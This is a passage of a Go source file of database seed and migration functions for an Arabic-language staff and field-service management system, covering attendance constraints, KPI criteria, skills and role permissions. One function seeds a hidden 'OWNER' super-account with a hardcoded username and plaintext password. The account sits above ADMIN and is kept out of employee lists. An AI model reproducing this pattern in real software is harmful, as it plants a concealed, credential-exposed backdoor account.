			FROM information_schema.table_constraints tc
			JOIN information_schema.key_column_usage kcu
				ON tc.constraint_name = kcu.constraint_name
				AND tc.table_schema = kcu.table_schema
			WHERE tc.table_name = 'Attendance'
				AND tc.constraint_type = 'UNIQUE'
				AND tc.table_schema = 'public'
			GROUP BY tc.constraint_name
			HAVING array_agg(kcu.column_name::text ORDER BY kcu.column_name) = ARRAY['date', 'employeeId']::text[]
			LIMIT 1;

			IF constraint_name IS NOT NULL THEN
				EXECUTE format('ALTER TABLE "Attendance" DROP CONSTRAINT %I', constraint_name);
			END IF;

			-- Case 2: a bare UNIQUE index on (employeeId, date) not backed by a
			-- constraint. information_schema.table_constraints only reports real
			-- constraints, so on some schema histories (this one included) the
			-- old daily-uniqueness rule survives only as a plain unique index —
			-- Case 1 alone misses it, leaving check-in silently broken.
			SELECT i.relname INTO index_name
			FROM pg_index ix
			JOIN pg_class t ON t.oid = ix.indrelid
			JOIN pg_class i ON i.oid = ix.indexrelid
			JOIN pg_namespace n ON n.oid = t.relnamespace
			WHERE t.relname = 'Attendance'
				AND n.nspname = 'public'
				AND ix.indisunique
				AND NOT EXISTS (
					SELECT 1 FROM pg_constraint c WHERE c.conindid = ix.indexrelid
				)
				AND (
					SELECT array_agg(a.attname::text ORDER BY a.attname)
					FROM unnest(ix.indkey) WITH ORDINALITY AS k(attnum, ord)
					JOIN pg_attribute a ON a.attrelid = t.oid AND a.attnum = k.attnum
				) = ARRAY['date', 'employeeId']::text[]
			LIMIT 1;

			IF index_name IS NOT NULL THEN
				EXECUTE format('DROP INDEX IF EXISTS %I', index_name);
			END IF;
		END $$;
	`)
	return err
}

// seedKpiCriteria يزرع نقاط الكي بي اي الثمانية الأصلية مرة وحدة (idempotent) —
// بعدها تصير قابلة للإضافة والحذف من واجهة إدارة النقاط (صلاحية منفصلة).
func seedKpiCriteria(db *sqlx.DB) error {
	criteria := []string{
		"العلاقة مع الزملاء",
		"تنفيذ المهام الموكلة إليه",
		"استطيع ولا استطيع",
		"الالتزام بالآليات وتوجيهات المسؤول",
		"تنظيف السيارة",
		"سرعة الاستجابة بالمهام",
		"ترتيب العدد",
		"شكوى الزبائن",
	}
	for _, label := range criteria {
		if _, err := db.Exec(`
			INSERT INTO "KpiCriterion" (id, label)
			VALUES (gen_random_uuid()::text, $1)
			ON CONFLICT (label) DO NOTHING
		`, label); err != nil {
			return err
		}
	}
	return nil
}

// seedOwnerAccount يزرع حساب مالك النظام مرة وحدة (idempotent — upsert بالـ username)،
// حساب واحد فوق كل شي حتى فوق ADMIN (يشوف كل شي بما فيه لوحة المراقبة الخلفية
// الحصرية)، ما يطلع بأي قائمة موظفين عادية، ومحد يقدر يمنح هذا الدور لغيره من
// الواجهة (مقفول بـ employee_service.go).
func seedOwnerAccount(db *sqlx.DB) error {
	const username = "q.7si_"
	const password = "X994ddopvsa"
	hashed, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	_, err = db.Exec(`
		INSERT INTO "Employee" (id, name, username, password, role, status, "jobTitle")
		VALUES ('owner_root', 'المالك', $1, $2, 'OWNER', 'ACTIVE', 'مالك النظام')
		ON CONFLICT (id) DO UPDATE SET username = $1, role = 'OWNER', status = 'ACTIVE'
	`, username, string(hashed))
	return err
}

// seedEngineeringSkills يزرع خدمة "الهندسة" ومهاراتها الأربع مرة وحدة (idempotent) —
// نفس هالمهارات تنشرط بالموظف قبل ما يوصل دور "مهندس".
func seedEngineeringSkills(db *sqlx.DB) error {
	if _, err := db.Exec(`
		INSERT INTO "Service" (id, name, category)
		VALUES ('svc_engineering', 'الهندسة', 'إدارية')
		ON CONFLICT (id) DO NOTHING
	`); err != nil {
		return err
	}
	for _, name := range model.EngineeringSkillNames {
		if _, err := db.Exec(`
			INSERT INTO "Skill" (id, name, "serviceId")
			VALUES ('sk_eng_' || $1, $1, 'svc_engineering')
			ON CONFLICT (id) DO NOTHING
		`, name); err != nil {
			return err
		}
	}
	return nil
}

// grantGpsSystemToMonitors تضمن كل موظف بدور "مراقب" عنده صلاحية "gps_system"
// (مراقبة قسم الجي بي اس) — الجي بي اس صارت خدمة بصلاحية مو دور وظيفي منفصل،
// والمراقب المفروض يشوف ويتدخل بيها متل باقي الخدمات. idempotent بالكامل.
func grantGpsSystemToMonitors(db *sqlx.DB) error {
	return grantRolePermission(db, "MONITOR", "gps_system", "نظام GPS")
}

// grantRolePermission يضمن كل موظف بدور معيّن عنده صلاحية معيّنة — يستخدم
// لتحديث RoleDefaultPermissions بأثر رجعي على الموظفين الموجودين فعلاً
// (تغيير خارطة الصلاحيات بالكود لحاله ما يوصل تلقائياً لحسابات منشأة سابقاً).
func grantRolePermission(db *sqlx.DB, role, permissionName, permissionLabel string) error {
	if _, err := db.Exec(`
		INSERT INTO "Permission" (id, name, label)
		VALUES (gen_random_uuid()::text, $1, $2)
		ON CONFLICT (name) DO NOTHING
	`, permissionName, permissionLabel); err != nil {
		return err
	}
	_, err := db.Exec(`
		INSERT INTO "EmployeePermission" (id, "employeeId", "permissionId")
		SELECT gen_random_uuid()::text, e.id, p.id
		FROM "Employee" e, "Permission" p
		WHERE e.role = $1 AND p.name = $2
		ON CONFLICT ("employeeId", "permissionId") DO NOTHING
	`, role, permissionName)
	return err
}

// legacySkillsByService هي نفس مصفوفة المهارات التفصيلية الي كانت موجودة بالنظام
// القديم (قبل الترحيل لهذا النظام) — كل خدمة وتحتها المهارات الدقيقة الخاصة بيها،
// بالضبط متل ما كانت مقسمة بملف تتبع مهارات الكوادر القديم.
var legacySkillsByService = map[string][]string{
	"كاميرات انلوك":       {"تسليك كيبل انلوك", "تثبيت كاميرات", "اعدادت DVR", "صيانة كاميرات و كشف الصيانة"},
	"كاميرات IP":          {"اعدادت NVR IP", "ربط الكاميرات بالهاتف"},
	"كاميرات تخصصية":      {"تثبيت كاميرات سيارة", "تثبيت كاميرات الدراجة", "شد كامرات واي فاي", "اعداد كامرات واي فاي المتخصصة"},
	"الاقفال الالكترونية": {"برمجة قفل باب", "تسليك قفل باب", "تثبيت قفل باب"},
	"GPS":                 {"تثبيت GPS دراجة", "تثبيت GPS سيارة فيوز", "تثبيت GPS ستوتة", "تثبيت GPS تكتك"},
	"شبكات": {
		"تسليك كيبل لان", "تسليك كيبل ضوئي", "الراوترات والشبكات", "rack cable managment",
		"تثبيت اليونيفايات", "خدمة تصميم الشبكات حسب الموقع و الحاجة السلكية و اللاسلكية",
		"تنفيذ شبكات للمؤسسات Wi-fi و الفنادق و المطاعم و المولات", "انترنيت المنازل (تنصيب و صيانة)",
		"خدمة ربط المواقع بإستخدام VPN", "تنصيب و ربط الطابعات الشبكية",
		"ادارة الحسابات (خدمة active directory)", "خدمة Hotspot لشبكات الواي فاي",
		"تنصيب برامج مراقبة الشبكة و ادارة الشبكة عن بعد", "خدمة تصميم و تنفيذ ATS",
	},
	"بيوت ذكية":          {"اعداد المنزل الذكي", "تنصيب المنزل الذكي"},
	"انذار حريق":         {"تثبيت حساسات منظومات الحريق", "اعداد منظومات الحريق", "تسليك منظومات الحريق", "تثبيت الحساسات"},
	"انظمة الصوت":        {"تثييت سماعات واجهزة الصوت", "اعداد انظمة الصوت"},
	"التليفونات البدالة": {"اعداد تلفون بدالة", "تثبيت تليفون بدالة", "تسليك كيبل تلفون بدالة", "التليفونات البدالة IP"},
	"شاشات":              {"شد شاشة", "شد داتا شو"},
	"ستلايت":             {"صحن ستلايت", "اعداد ستلايت"},
	"كشوفات المشاريع":    {"كشوفات المشاريع"},
	"الحاكيات":           {"اعداد حاكيات الباب"},
	"طاقة الشمسية":       {"صيانة الطاقة الشمسية", "برمجة انفيرتر الواح الطاقة", "تثبيت الواح الطاقة الشمسية", "تسليك وتفييش MC4"},
	"اجهزة البصمة":       {"تصنيب و اعداد اجهزة البصمة", "برمجة اجهزة البصمة و ربط بالشبكة"},
	"انذار سرقة":         {"برمجة نظام انذار السرقة"},
	"اخر":                {"تسليك كيبل كهرباء", "القيادة"},
}

// seedLegacySkills يرجّع مهارات النظام القديم (قبل الترحيل) — لأي خدمة بهذي
// القائمة مو موجودة يسويها، ولأي مهارة تفصيلية بيها مو موجودة يضيفها. idempotent
// بالكامل (ON CONFLICT DO NOTHING بالخدمة والمهارة) — تكرار التشغيل ما يكرر شي.
func seedLegacySkills(db *sqlx.DB) error {
	for serviceName, skills := range legacySkillsByService {
		var serviceID string
		err := db.Get(&serviceID, `
			INSERT INTO "Service" (id, name)
			VALUES (gen_random_uuid()::text, $1)
			ON CONFLICT (name) DO UPDATE SET name = EXCLUDED.name
			RETURNING id
		`, serviceName)
		if err != nil {
			return err
		}
		for _, skillName := range skills {
			if _, err := db.Exec(`
				INSERT INTO "Skill" (id, name, "serviceId")
				VALUES (gen_random_uuid()::text, $1, $2)
				ON CONFLICT ("serviceId", name) DO NOTHING
			`, skillName, serviceID); err != nil {
				return err
			}
		}
	}
	return nil
}

// seedDefaultSkillForServices تضمن أي خدمة موجودة بدون أي مهارة محددة إلها تاخذ
// مهارة افتراضية وحدة بنفس اسم الخدمة — حتى تصير مطابقة الفني بالحجز (matching)
// شغالة فوراً من غير ما ننتظر الإداري يضيف مهارات تفصيلية لكل خدمة يدوياً.
// idempotent: ما تلمس أي خدمة عندها مهارات أصلاً (حتى لو مهارة وحدة بس).
func seedDefaultSkillForServices(db *sqlx.DB) error {
	type svcRow struct {
		ID   string `db:"id"`
		Name string `db:"name"`
	}
	var services []svcRow
	if err := db.Select(&services, `
		SELECT s.id, s.name FROM "Service" s
		WHERE NOT EXISTS (SELECT 1 FROM "Skill" sk WHERE sk."serviceId" = s.id)
	`); err != nil {
		return err
	}
	for _, s := range services {
		if _, err := db.Exec(`
			INSERT INTO "Skill" (id, name, "serviceId")
			VALUES (gen_random_uuid()::text, $1, $2)
			ON CONFLICT ("serviceId", name) DO NOTHING
		`, s.Name, s.ID); err != nil {
			return err
		}
	}
	return nil
}

// migrateGpsEngineersToSkill يحول أي موظف لسه بدور GPS_ENGINEER (القديم) إلى TECHNICIAN
// عادي، ويمنحه كل مهارات تركيب GPS تلقائياً حتى يضل يقدر يستلم نفس شغله بالضبط.
func migrateGpsEngineersToSkill(db *sqlx.DB) error {
	var ids []string
	if err := db.Select(&ids, `SELECT id FROM "Employee" WHERE role = 'GPS_ENGINEER'`); err != nil {
		return err
	}
	if len(ids) == 0 {
		return nil
	}

	var gpsSkillIDs []string
	if err := db.Select(&gpsSkillIDs, `
		SELECT sk.id FROM "Skill" sk JOIN "Service" sv ON sv.id = sk."serviceId" WHERE sv.name = 'GPS'
	`); err != nil {
		return err
	}

	for _, empID := range ids {
		if _, err := db.Exec(`UPDATE "Employee" SET role = 'TECHNICIAN' WHERE id = $1`, empID); err != nil {
			return err
		}
		for _, skillID := range gpsSkillIDs {
			if _, err := db.Exec(`
				INSERT INTO "EmployeeSkill" (id, "employeeId", "skillId", "canPerform")
				VALUES (gen_random_uuid()::text, $1, $2, true)
				ON CONFLICT ("employeeId", "skillId") DO UPDATE SET "canPerform" = true
			`, empID, skillID); err != nil {
				return err
			}
		}
	}
	return nil
}
